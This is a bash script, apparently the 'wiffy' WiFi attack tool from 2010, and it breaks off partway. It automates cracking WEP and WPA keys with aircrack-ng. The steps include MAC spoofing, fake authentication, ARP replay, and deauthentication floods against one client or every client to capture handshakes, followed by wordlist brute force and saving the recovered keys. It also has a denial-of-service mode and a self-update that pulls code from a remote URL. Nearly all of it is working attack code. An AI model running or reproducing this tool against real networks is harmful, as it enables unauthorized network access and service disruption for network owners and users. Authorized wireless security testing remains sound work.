#!/bin/bash
#----------------------------------------------------------------------------------------------#
#wiffy.sh v0.1 (#16 2010-09-17)                                                                #
# (C)opyright 2010 - g0tmi1k                                                                   #
#---License------------------------------------------------------------------------------------#
#  This program is free software: you can redistribute it and/or modify it under the terms     #
#  of the GNU General Public License as published by the Free Software Foundation, either      #
#  version 3 of the License, or (at your option) any later version.                            #
#                                                                                              #
#  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
#  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
#  See the GNU General Public License for more details.                                        #
#                                                                                              #
#  You should have received a copy of the GNU General Public License along with this program.  #
#  If not, see <http://www.gnu.org/licenses/>.                                                 #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces you use
interface="wlan0"

# [crack/dos] Crack - cracks WiFi Keys, dos - blocks access to ap.
mode="crack"

# [random/set/false] Change the MAC address
macMode="set"
fakeMac="00:05:7c:9a:58:3f"

# [/path/to/the/folder] The file used to brute force WPA keys.
wordlist="/pentest/passwords/wordlists/wpa.txt"

# [true/false] Connect to network afterwords
extras="false"

# [true/false] diagnostics = Creates a output file displays exactly whats going on. [0/1/2] verbose = Shows more info. 0=normal, 1=more , 2=more+commands
diagnostics="false"
verbose="0"

#---Variables----------------------------------------------------------------------------------#
         version="0.1 (#16)"  # Version
monitorInterface="mon0"       # Default
           bssid=""           # null the value
           essid=""           # null the value
         channel=""           # null the value
          client=""           # null the value
           debug="false"      # Windows don't close, shows extra stuff
         logFile="wiffy.log"  # filename of output
trap 'cleanup interrupt' 2    # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function action() { #action title command #screen&file #x|y|lines #hold
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ ! -z "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ] ; then error="3" ; fi # Coding error
   if [ ! -z "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ] ; then error="5" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$5" == "true" ] ; then xterm="$xterm -hold" ; fi
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi
      if [ "$diagnostics" == "true" ] ; then echo "$1~$command" >> $logFile ; fi
      if [ "$diagnostics" == "true" ] && [ "$3" == "true" ] ; then command="$command | tee -a $logFile" ; fi
      if [ ! -z "$4" ] ; then
         x=$(echo $4 | cut -d'|' -f1)
         y=$(echo $4 | cut -d'|' -f2)
         lines=$(echo $4 | cut -d'|' -f3)
      fi
      $xterm -geometry 100x$lines+$x+$y -T "wiffy v$version - $1" -e "$command"
      return 0
   else
      display error "action. Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: action (Error code: $error): $1, $2, $3, $4, $5" >> $logFile ;
      return 1
   fi
}
function cleanup() { #cleanup #mode
   if [ "$1" == "nonuser" ] ; then exit 3 ;
   elif [ "$1" != "clean" ] && [ "$1" != "remove" ]; then
      echo # Blank line
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "*** BREAK ***" ; fi # User quit
      action "Killing xterm" "killall xterm"
   fi

   if [ "$1" != "remove" ]; then
      display action "Restoring: Environment"
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Restoring: Programs" ; fi
      command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
      if [ "$command" == "$monitorInterface" ] ; then
         sleep 3 # Sometimes it needs to catch up/wait
         action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
      fi
      action "Starting 'wicd service'" "/etc/init.d/wicd start"           # Backtrack
      action "Starting 'network manager'" "service network-manager start" # Ubuntu
   fi

   if [ "$debug" != "true" ] || [ "$1" == "remove" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Removing: Temp files" ; fi
      command=""
      tmp=$(ls /tmp/wiffy-*.cap 2> /dev/null)
      if [ "$tmp" ] ; then command="$command /tmp/wiffy-*" ; fi
      tmp=$(ls /tmp/wiffy.dump*.netxml 2> /dev/null)
      if [ "$tmp" ] ; then command="$command /tmp/wiffy.dump*" ; fi
      tmp=$(ls replay_arp*.cap 2> /dev/null)
      if [ "$tmp" ] ; then command="$command replay_arp*.cap" ; fi
      if [ -e "/tmp/wiffy.key" ] ; then command="$command /tmp/wiffy.key" ; fi
      if [ -e "/tmp/wiffy.tmp" ] ; then command="$command /tmp/wiffy.tmp" ; fi
      if [ -e "/tmp/wiffy.handshake" ] ; then command="$command /tmp/wiffy.handshake" ; fi
      if [ ! -z "$command" ] ; then action "Removing temp files" "rm -rfv $command" ; fi
   fi

   if [ "$1" != "remove" ] ; then
      if [ "$diagnostics" == "true" ] ; then echo -e "End @ $(date)" >> $logFile ; fi
      echo -e "\e[01;36m[*]\e[00m Done! (= Have you... g0tmi1k?"
      exit 0
   fi
}
function display() { #display type message
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="5"; fi # Coding error

   if [ "$error" == "free" ] ; then
      output=""
      if [ "$1" == "action" ] ; then output="\e[01;32m[>]\e[00m" ; fi
      if [ "$1" == "info" ] ; then output="\e[01;33m[i]\e[00m" ; fi
      if [ "$1" == "diag" ] ; then output="\e[01;34m[+]\e[00m" ; fi
      if [ "$1" == "error" ] ; then output="\e[01;31m[!]\e[00m" ; fi
      output="$output $2"
      echo -e "$output"

      if [ "$diagnostics" == "true" ] ; then
         if [ "$1" == "action" ] ; then output="[>]" ; fi
         if [ "$1" == "info" ] ; then output="[i]" ; fi
         if [ "$1" == "diag" ] ; then output="[+]" ; fi
         if [ "$1" == "error" ] ; then output="[!]" ; fi
         echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
      fi
      return 0
   else
      display error "display. Error code: $error" $logFile 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: display (Error code: $error): $1, $2" >> $logFile ;
      return 1
   fi
}
function findAP () { #findAP
   for (( i=1; i<=3; i++ )) ; do
      if [ -e "/tmp/wiffy.tmp" ] && grep -q "No scan results" "/tmp/wiffy.tmp" ; then action "Refreshing interface" "ifconfig $interface down && ifconfig $interface up && sleep 1" ; fi
      action "Scanning network" "rm -f /tmp/wiffy.tmp && iwlist $interface scan > /tmp/wiffy.tmp"
      if [ -e "/tmp/wiffy.tmp" ] && ! grep -q "No scan results" "/tmp/wiffy.tmp" ; then break ; fi
   done

   #arrayESSID=( $(cat /tmp/wiffy.tmp | awk -F ':' '/ESSID/{print $2}') )
   arrayBSSID=( $(cat /tmp/wiffy.tmp | grep "Address:" | awk '{print $5}\') )
   arrayChannel=( $(cat /tmp/wiffy.tmp | grep "Channel:" | tr ':' ' ' | awk '{print $2}\') )
   arrayProtected=( $(cat /tmp/wiffy.tmp | grep "key:" | sed 's/.*key://g') )
   arrayQuality=( $(cat /tmp/wiffy.tmp | grep "Quality" | sed 's/.*Quality=//g' | awk -F " " '{print $1}' ) )

   id=""
   index="0"
   for item in "${arrayBSSID[@]}"; do
      if [ "$bssid" ] && [ "$bssid" == "$item" ] ; then id="$index" ;fi
      command=$(cat /tmp/wiffy.tmp | sed -n "/$item/, +20p" | grep "WPA" )
      if [ "$command" ] ; then arrayEncryption[$index]="WPA"
      elif [ ${arrayProtected[$index]} == "off" ] ; then arrayEncryption[$index]="N/A"
      else arrayEncryption[$index]="WEP" ; fi
      index=$(($index+1))
   done

   #-Cheap hack to support essids with spaces in-----------------------------------------------------------
   cat "/tmp/wiffy.tmp" | awk -F ":" '/ESSID/{print $2}' | sed 's/\"//' | sed 's/\(.*\)\"/\1/' > "/tmp/wiffy.ssid"
   index="0"
   while read line ; do
      if [ "$essid" ] && [ "$essid" == "$line" ] ; then id="$index" ;  fi
      arrayESSID[$index]="$line"
      index=$(($index+1))
   done < "/tmp/wiffy.ssid"
   rm -f "/tmp/wiffy.ssid"
   #--------------------------------------------------------------------------------------------------------------
}
function findClient () { #findClient $encryption
   if [ -z "$1" ] && [ -z "$2" ] ; then error="1" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      client=""
      action "Removing temp files" "rm -f /tmp/wiffy.dump* && sleep 1"
      action "airodump-ng (client(s))" "airodump-ng --bssid $bssid --channel $channel --write /tmp/wiffy.dump --output-format netxml $monitorInterface" &
      sleep 3

      if [ "$1" == "WEP" ] || [ "$1" == "N/A" ] ; then # N/A = For MAC filtering
         sleep 5
         client=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
      elif [ "$1" == "WPA" ] ; then
         while [ -z "$client" ] ; do
            sleep 2
            client=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
         done
      fi

      if [ -z "$essid" ] ; then
         essid=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "<essid cloaked=\"false\">" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/')
         if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "*hidden* essid=$essid" ; fi
      fi

      command=$(ps aux | grep "airodump-ng" | awk '!/grep/ && !/awk/ && !/cap/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
      if [ -n "$command" ] ; then
         action "Killing programs" "kill $command"
         sleep 1
      fi

      action "Removing temp files" "rm -f /tmp/wiffy.dump*"
      if [ "$client" == "" ] ; then client="clientless" ; fi
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "client=$client" ; fi
      return 0
   else
      display error "findClient. Error code: $error" 1>&2
      return 1
   fi
}
function help() { #help
   echo "(C)opyright 2010 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash wiffy.sh -i [interface] -t [interface] -m [crack/dos] -e [essid] -b [bssid]
               -c [mac] -w [/path/to/file] (-z / -s [mac]) -x -d (-v / -V) ([-u] [-?])

 Options:
   -i  ---  Internet Interface e.g. $interface
   -t  ---  Monitor Interface  e.g. $monitorInterface

   -m  ---  Mode. e.g. $mode

   -e  ---  ESSID (WiFi Name)
   -b  ---  BSSID (AP MAC Address)
   -c  ---  Client to use

   -w  ---  Path to Wordlist e.g. $wordlist

   -z  ---  Change interface's MAC Address e.g. $macMode
   -s  ---  Use this MAC Address e.g. $fakeMac

   -x  ---  Connect to network afterwords

   -d  ---  Diagnostics      (Creates output file, $logFile)
   -v  ---  Verbose          (Displays more)
   -V  ---  (Higher) Verbose (Displays more + shows commands)

   -u  ---  Update script
   -?  ---  This screen



 Known issues:
    -WEP
       > Didn't detect my client
          + Add it in manually
          + Re-run the script
       > IV's doesn't increae
          + DeAuth didn't work --- Client using Windows 7?
          + Use a different router/client

    -WPA
       > You can ONLY crack WPA when:
          + The ESSID is known
          + The WiFi key is in the word-list
          + There is a connected client

    -Doesn't detect any/my wireless network
       > Don't run from a virtual machine
       > Driver issue - Use a different WiFi device
       > Re-run the script
       > Unplug WiFi device, wait, replug
       > You're too close/far away

    -\"Extras\" doesn't work
       > Network doesn't have a DHCP server

    -Slow
       > Try a different attack... manually!
"
   exit 1
}
function update() { #update
   if [ -e "/usr/bin/svn" ] ; then
      display action "Checking for an update..."
      update=$(svn info http://g0tmi1k.googlecode.com/svn/trunk/wiffy/ | grep "Last Changed Rev:" | cut -c19-)
      if [ "$version" != "0.3 (#$update)" ] ; then
         display info "Updating..."
         svn export -q --force http://g0tmi1k.googlecode.com/svn/trunk/wiffy/wiffy.sh wiffy.sh
         display info "Updated to $update. (="
      else
         display info "You're using the latest version. (="
      fi
   else
      display info "Updating..."
      wget -nv -N http://g0tmi1k.googlecode.com/svn/trunk/wiffy/wiffy.sh
      display info "Updated! (="
   fi
   echo
   exit 2
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m wiffy v$version"

#----------------------------------------------------------------------------------------------#
while getopts "i:t:m:e:b:c:w:z:s:xdvVu?" OPTIONS; do
   case ${OPTIONS} in
      i ) interface=$OPTARG;;
      t ) monitorInterface=$OPTARG;;
      m ) mode=$OPTARG;;
      e ) essid=$OPTARG;;
      b ) bssid=$OPTARG;;
      c ) client=$OPTARG;;
      w ) wordlist=$OPTARG;;
      z ) macMode=$OPTARG;;
      s ) fakeMac=$OPTARG;;
      x ) extras="true";;
      d ) diagnostics="true";;
      v ) verbose="1";;
      V ) verbose="2";;
      u ) update;;
      ? ) help;;
      * ) display error "Unknown option." 1>&2 ;;   # Default
   esac
done

#----------------------------------------------------------------------------------------------#
if [ "$debug" == "true" ] ; then
   display info "Debug mode"
fi
if [ "$diagnostics" == "true" ] ; then
   display diag "Diagnostics mode"
   echo -e "wiffy v$version\nStart @ $(date)" > $logFile
   echo "wiffy.sh" $* >> $logFile
fi

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ] ; then display error "Not a superuser." 1>&2 ; cleanup nonuser; fi

#----------------------------------------------------------------------------------------------#
cleanup remove

#----------------------------------------------------------------------------------------------#
if [ -z "$interface" ] ; then display error "interface can't be blank" 1>&2 ; cleanup ; fi
if [ -z "$monitorInterface" ] ; then display error "monitorInterface can't be blank" 1>&2 ; cleanup ; fi
if [ "$mode" != "crack" ] && [ "$mode" != "dos" ] ; then display error "mode ($mode) isn't correct" 1>&2 ; cleanup ; fi
if [ ! -e "$wordlist" ] ; then display error "Unable to crack WPA due to there isn't a wordlist at: $wordlist" 1>&2 ; fi # Can't do WPA...
if [ "$macMode" != "random" ] && [ "$macMode" != "set" ] && [ "$macMode" != "false" ] ; then display error "macMode ($macMode) isn't correct" 1>&2 ; cleanup ; fi
if [ "$macMode" == "set" ] ; then if [ -z "$fakeMac" ] || [ ! $(echo $fakeMac | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ] ; then display error "fakeMac ($fakeMac) isn't correct" 1>&2 ; cleanup ; fi ; fi
if [ "$mode" == "crack" ] && [ "$extras" != "true" ] && [ "$extras" != "false" ] ; then display error "extras ($extras) isn't correct" 1>&2 ; cleanup ; fi
if [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then display error "diagnostics ($diagnostics) isn't correct" 1>&2 ; cleanup ; fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then display error "verbose ($verbose) isn't correct" 1>&2 ; cleanup ; fi
if [ -z "$version" ] ; then display error "version ($version) isn't correct" 1>&2 ; cleanup ; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then display error "debug ($debug) isn't correct" 1>&2 ; cleanup ; fi
if [ "$diagnostics" == "true" ] && [ -z "$logFile" ] ; then display error "logFile ($logFile) isn't correct" 1>&2 ; cleanup ; fi

#----------------------------------------------------------------------------------------------#
command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d " " -f1)
if [ ! $command ]; then
   display error "$interface isn't a wireless interface."
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Searching for a wireless interface" ; fi
   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d " " -f1) #| awk '!/"'"$interface"'"/'
   if [ $command ] ; then
      interface=$command
      display info "Found $interface"
   else
      display error "Couldn't find a wireless interface." 1>&2
      cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Stopping: Programs" ; fi
command=$(ps aux | grep "$interface" | awk '!/grep/ && !/awk/ && !/wiffy/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
if [ -n "$command" ] ; then
   action "Killing programs" "kill $command" # to prevent interference
fi
action "Killing programs" "killall wicd-client airodump-ng xterm wpa_action wpa_supplicant wpa_cli dhclient ifplugd dhcdbd dhcpcd NetworkManager knetworkmanager avahi-autoipd avahi-daemon wlassistant wifibox" # Killing "wicd-client" to prevent channel hopping
action "Killing 'wicd service'" "/etc/init.d/wicd stop" # Stopping wicd to prevent channel hopping
action "Killing 'network manager'" "service network-manager stop" # Ubuntu

#----------------------------------------------------------------------------------------------#
action "Refreshing interface" "ifconfig $interface down && ifconfig $interface up && sleep 1"

#----------------------------------------------------------------------------------------------#
loopMain="false"
while [ "$loopMain" != "true" ] ; do
   findAP
   if [ "$id" ] ; then
      loopMain="true"
   else
      if [ "$essid" ] ; then display error "Couldnt find essid ($essid)" 1>&2 ; fi
      if [ "$bssid" ] ; then display error "Couldnt find bssid ($bssid)" 1>&2 ; fi
      loop=${#arrayBSSID[@]}
      echo -e " Num |         ESSID          |       BSSID       | Protected | Cha | Quality\n-----|------------------------|-------------------|-----------|-----|---------"
      for (( i=0;i<$loop;i++)); do
         printf '  %-2s | %-22s | %-16s | %3s (%-3s) |  %-3s|  %-6s\n' "$(($i+1))" "${arrayESSID[${i}]}" "${arrayBSSID[${i}]}" "${arrayProtected[${i}]}" "${arrayEncryption[${i}]}" "${arrayChannel[${i}]}" "${arrayQuality[${i}]}"
      done
      loopSub="false"
      while [ "$loopSub" != "true" ] ; do
         read -p "[~] re[s]can, e[x]it or select num: "
         if [ "$REPLY" == "x" ] ; then cleanup clean
         elif [ "$REPLY" == "s" ] ; then loopSub="true" # aka do nothing
         elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input, $REPLY" 1>&2
         elif [ "$REPLY" -lt 1 ] || [ "$REPLY" -gt $loop ] ; then display error "Incorrect number, $REPLY" 1>&2
         else id="$(($REPLY-1))" ; loopSub="true" ; loopMain="true"
         fi
      done
   fi
done
essid="${arrayESSID[$id]}"
bssid="${arrayBSSID[$id]}"
channel="${arrayChannel[$id]}"
encryption="${arrayEncryption[$id]}"
mac=$(macchanger --show "$interface" | awk -F " " '{print $3}')
if [ -e "/sys/class/net/$interface/device/driver" ] ; then wifiDriver=$(ls -l "/sys/class/net/$interface/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/') ; fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then
   echo "-Settings------------------------------------------------------------------------------------
        interface=$interface
 monitorInterface=$monitorInterface
             mode=$mode
            essid=$essid
            bssid=$bssid
       encryption=$encryption
          channel=$channel
           client=$client
         wordlist=$wordlist
              mac=$mac
          macMode=$macMode
          fakeMac=$fakeMac
      diagnostics=$diagnostics
          verbose=$verbose
            debug=$debug
       wifiDriver=$wifiDriver
-Environment---------------------------------------------------------------------------------" >> $logFile
   display diag "Detecting: Kernel"
   uname -a >> $logFile
   display diag "Detecting: Hardware"
   lspci -knn >> $logFile
fi
if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    display info "       interface=$interface
\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
\e[01;33m[i]\e[00m             mode=$mode
\e[01;33m[i]\e[00m            essid=$essid
\e[01;33m[i]\e[00m            bssid=$bssid
\e[01;33m[i]\e[00m       encryption=$encryption
\e[01;33m[i]\e[00m          channel=$channel
\e[01;33m[i]\e[00m           client=$client
\e[01;33m[i]\e[00m         wordlist=$wordlist
\e[01;33m[i]\e[00m              mac=$mac
\e[01;33m[i]\e[00m          macMode=$macMode
\e[01;33m[i]\e[00m          fakeMac=$fakeMac
\e[01;33m[i]\e[00m      diagnostics=$diagnostics
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m       wifiDriver=$wifiDriver"
fi

#----------------------------------------------------------------------------------------------#
if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
   display error "aircrack-ng isn't installed." 1>&2
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install aircrack-ng" "apt-get -y install aircrack-ng" ; fi
   if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
      display error "Failed to install aircrack-ng" 1>&2 ; cleanup
   else
      display info "Installed: aircrack-ng"
   fi
fi
if [ ! -e "/usr/bin/macchanger" ] ; then
   display error "macchanger isn't installed."
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install macchanger" "apt-get -y install macchanger" ; fi
   if [ ! -e "/usr/bin/macchanger" ] ; then
      display error "Failed to install macchanger" 1>&2 ; cleanup
   else
      display info "Installed: macchanger"
   fi
fi
#if [ "$attack" == "inject" ] ; then
#   if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
#      display error "airpwn isn't installed."
#      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
#      if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install airpwn" "apt-get -y install libnet1-dev libpcap-dev python2.4-dev libpcre3-dev libssl-dev" ; fi
#      action "Install airpwn" "wget -P /tmp http://downloads.sourceforge.net/project/airpwn/airpwn/1.4/airpwn-1.4.tgz && tar -C /pentest/wireless -xvf /tmp/airpwn-1.4.tgz && rm /tmp/airpwn-1.4.tgz"
#      find="#ifndef _LINUX_WIRELESS_H"
#      replace="#include <linux\/if.h>\n#ifndef _LINUX_WIRELESS_H"
#      sed "s/$replace/$find/g" "/usr/include/linux/wireless.h" > "/usr/include/linux/wireless.h.new"
#      sed "s/$find/$replace/g" "/usr/include/linux/wireless.h.new" > "/usr/include/linux/wireless.h"
#      rm -f "/usr/include/linux/wireless.h.new"
#      action "Install airpwn" "command=$(pwd) && tar -C /pentest/wireless/airpwn-1.4 -xvf /pentest/wireless/airpwn-1.4/lorcon-current.tgz && cd /pentest/wireless/airpwn-1.4/lorcon && ./configure && make && make install && cd $command"
#      action "Install airpwn" "command=$(pwd) && cd /pentest/wireless/airpwn-1.4 && ./configure && make && cd $command"
#      if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
#         display error "Failed to install airpwn" 1>&2 ; cleanup
#      else
#         display info "Installed: airpwn"
#      fi
#   fi
#fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: Wireless card" ; fi
command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" == "$monitorInterface" ] ; then
   action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
   sleep 1
fi

action "Monitor Mode (Starting)" "airmon-ng start $interface | tee /tmp/wiffy.tmp"
command=$(cat /tmp/wiffy.tmp | awk '/monitor mode enabled on/ {print $5}' | tr -d '\011' | sed 's/\(.*\)./\1/')
if [ "$monitorInterface" != "$command" ] ; then
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Configuring: Chaning monitorInterface to: $command" ; fi
   if [ $command ] ; then monitorInterface="$command" ; fi
fi

command=$(ifconfig -a | grep "$monitorInterface" | awk '{print $1}')
if [ "$command" != "$monitorInterface" ] ; then
   sleep 5 # Some people need to wait a little bit longer (e.g. VM), some don't. Don't force the ones that don't need it!
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" != "$monitorInterface" ] ; then
      display error "The monitor interface $monitorInterface, isn't correct." 1>&2
   if [ "$debug" == "true" ] ; then iwconfig; fi
   cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
   display diag "Testing: Wireless Injection"
   command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
   if [ "$diagnostics" == "true" ] ; then echo -e $command >> $logFile ; fi
   if [ -z "$(echo \"$command\" | grep 'Injection is working')" ] ; then display error "$monitorInterface doesn't support packet injecting." 1>&2
   elif [ -z "$(echo \"$command\" | grep 'Found 0 APs')" ] ; then display error "Couldn't test packet injection" 1>&2 ;
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$macMode" != "false" ] ; then
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: MAC address" ; fi
   command="ifconfig $monitorInterface down &&"
   if [ "$macMode" == "random" ] ; then command="$command macchanger -A $monitorInterface &&"; fi
   if [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $monitorInterface &&"; fi
   command="$command ifconfig $monitorInterface up"
   action "Configuring: MAC address" "$command"
   sleep 2
   mac="$fakeMac"
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "crack" ] ; then
   if [ -z "$client" ] ; then
      display action "Detecting: Client(s)"
      findClient $encryption
   fi

   #----------------------------------------------------------------------------------------------#
   display action "Starting: airodump-ng"
   action "Removing temp files" "rm -f /tmp/wiffy* && sleep 1"
   action "airodump-ng" "airodump-ng --bssid $bssid --channel $channel --write /tmp/wiffy --output-format cap $monitorInterface" "true" "0|0|13" & # Don't wait, do the next command
   sleep 1

   #----------------------------------------------------------------------------------------------#
   if [ "$encryption" == "WEP" ] ; then
      if [ "$client" == "clientless" ] ; then
         display action "Attack (FakeAuth): $fakeMac"
         action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $mac $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
         command=$(cat /tmp/wiffy.tmp)
         if grep -q "No such BSSID available" "/tmp/wiffy.tmp" ; then display error "Couldn't detect $essid" 1>&2 ;
         elif grep -q "Association successful" "/tmp/wiffy.tmp" ; then if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Attack (FakeAuth): Successfully association" ; fi ; fi
         client=$mac
         sleep 1
      fi
      display action "Attack (ARPReplay+Deauth): $client"
      action "aireplay-ng (arpreplay)" "aireplay-ng --arpreplay -e \"$essid\" -b $bssid -h $client $monitorInterface" "true" "0|195|5" & # Don't wait, do the next command
      sleep 1
      action "aireplay-ng (deauth)" "aireplay-ng --deauth 5 -e \"$essid\" -a $bssid -c $fakeMac $monitorInterface" "true" "0|290|5"
      sleep 1
      if [ "$client" == "$mac" ] ; then sleep 10 && action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" "true" "0|290|5" ; fi
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Waiting for IV's increase" ; fi
      sleep 60

   #----------------------------------------------------------------------------------------------#
   elif [ "$encryption" == "WPA" ] ; then
      display action "Capturing: Handshake"
      loop="0" # 0 = first, 1 = client, 2 = everyone
      echo "g0tmi1k" > /tmp/wiffy.tmp
      for (( ; ; )) ; do
         action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -w /tmp/wiffy.tmp -e \"$essid\" > /tmp/wiffy.handshake"
         command=$(cat /tmp/wiffy.handshake | grep "Passphrase not in dictionary") #Got no data packets from client network & No valid WPA handshakes found
         if [ "$command" ] ; then break; fi
         sleep 2
         if [ "$loop" != "1" ] ; then
            if [ "$loop" != "0" ] ; then findClient $encryption ; fi
            sleep 1
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Attack (Deauth): $client" ; fi
            action "aireplay-ng" "aireplay-ng --deauth 5 -a $bssid -c $client mon0"
            loop="1"
         else
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Attack (Deauth): *everyone*" ; fi
            action "aireplay-ng" "aireplay-ng --deauth 5 -a $bssid mon0"
            loop="2"
         fi
         sleep 1
      done
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Captured: Handshake" ; fi
      action "Killing programs" "killall xterm && sleep 1"
   fi

   #----------------------------------------------------------------------------------------------#
   if [ "$encryption" == "WEP" ] || [ "$encryption" == "WPA" ] && [ -e "$wordlist" ] ; then
      display action "Starting: aircrack-ng"
      if [ "$encryption" == "WEP" ] ; then action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -e \"$essid\" -l /tmp/wiffy.key" "false" "0|350|30" ; fi
      if [ "$encryption" == "WPA" ] ; then action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -w $wordlist -e \"$essid\" -l /tmp/wiffy.key" "false" "0|0|20" ; fi
   fi
   action "Killing programs" "killall xterm && sleep 1"
   action "airmon-ng" "airmon-ng stop $monitorInterface"

   #----------------------------------------------------------------------------------------------#
   if [ -e "/tmp/wiffy.key" ] ; then
      key=$(cat /tmp/wiffy.key)
      display info "WiFi key: $key"
      echo -e "---------------------------------------\n      Date: $(date)\n     ESSID: $essid\n     BSSID: $bssid\nEncryption: $encryption\n       Key: $key\n    Client: $client" >> "wiffy.key"
      #----------------------------------------------------------------------------------------------#
      if [ "$extras" == "true" ] ; then
         if [ "$client" != "$mac" ] ; then
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Attack (Spoofing): $client ('Helps' with MAC filtering) " ; fi
            action "Spoofing MAC" "ifconfig $interface down && macchanger -m $client $interface && ifconfig $interface up"
         fi
